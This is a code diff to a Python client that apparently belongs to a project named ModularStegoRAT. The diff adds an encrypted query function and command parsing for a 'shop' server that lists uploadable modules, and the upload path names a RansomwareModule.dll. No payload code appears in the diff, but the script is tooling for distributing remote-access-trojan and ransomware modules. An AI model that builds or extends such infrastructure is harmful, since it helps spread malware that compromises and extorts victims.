@@ -252,16 +252,52 @@ Description:
     
 publicKey, publicKeyBytes, privateKey, privateKeyBytes = CreateECCKeypair()
 
+def ModuleQuery(shopAES : AESGCM, shopSocket : socket.socket, shopSeedNonce : bytes, shopSeedNonceIncrement : int, queryType : str, query : str) -> int:
+    request = json.dumps({
+        "Type" : "MODULE_QUERY",
+        "Query Type" : queryType,
+        "Query" : query 
+    }).encode()
+    
+    request = shopAES.encrypt(IncrementNonce(shopSeedNonce, shopSeedNonceIncrement), request, None).ljust(DB_SHOP_SIZE_BYTES_CLIENT, b"\0")
+    shopSocket.send(request)
+    
+    response = shopSocket.recv(DB_SHOP_SIZE_BYTES_SERVER).rstrip(b"\0")
+    response = shopAES.decrypt(IncrementNonce(shopSeedNonce, shopSeedNonceIncrement + 1), response, None).decode()
+    response = json.loads(response)
+    
+    print(response["Status"])
+    
+    entries = response["Entries"]
+    print("-"*20)
+    for entry in entries:
+        print(
+f"""
+ID: {entry["Module ID"]}
+Name: {entry["Module Name"]}
+Owner : {entry["Module Owner Username"]}
+Version : {entry["Module Version"]}
+Last Edited: {ReformatTimestamp(entry["Module Last Edited"])}
+Dependencies : {entry["Dependencies"] if (entry["Dependencies"] != '""') else "None"}
+
+Description:
+{entry["Module Description"]} 
+""")
+        
+        print("-"*20)
+    
+    return shopSeedNonceIncrement + 2
+
 running = True
 shopping = False
 currentShopPage = -1
 
 while running:
-    userInput = input()
-    if(userInput == ".define" and (not shopping)):
+    userInput = input().split(" ")
+    if(userInput[0] == ".define" and (not shopping)):
         DefineNewUser("TestUser", "TestPass")
     
-    elif(userInput == ".upload" and (not shopping)):
+    elif(userInput[0] == ".upload" and (not shopping)):
         UploadNewModule(
             "TestMod2", 
             "C:\\Users\\iniga\\OneDrive\\Programming\\ModularStegoRAT\\Modules\\RansomwareModule\\x64\\Debug\\RansomwareModule.dll", 
@@ -271,26 +307,29 @@ while running:
             publicKeyBytes, 
             "")
 
-    elif(userInput == ".openShop" and (not shopping)):
+    elif(userInput[0] == ".openShop" and (not shopping)):
         shopAES, shopSocket, shopSeedNonce = StartShop()
         shopSeedNonceIncrement = 1
         shopping = True
     
-    elif(userInput == ".browseShop" and shopping):
+    elif(userInput[0] == ".browseShop" and shopping):
         if(currentShopPage == -1):
             currentShopPage = 0
         
         shopSeedNonceIncrement = BrowseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement, pageNo=currentShopPage)
     
-    elif(userInput == ".browseShopNext" and shopping):
+    elif(userInput[0] == ".browseShopNext" and shopping):
         currentShopPage += 1
         shopSeedNonceIncrement = BrowseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement, pageNo=currentShopPage)
     
-    elif(userInput == ".closeShop" and shopping):
+    elif(userInput[0] == ".moduleQuery" and shopping):
+        shopSeedNonceIncrement = ModuleQuery(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement, userInput[1], userInput[2])
+    
+    elif(userInput[0] == ".closeShop" and shopping):
         CloseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement)
         shopping = False
     
-    elif(userInput == ".quit"):
+    elif(userInput[0] == ".quit"):
         running = False
         if(shopping):
             CloseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement)
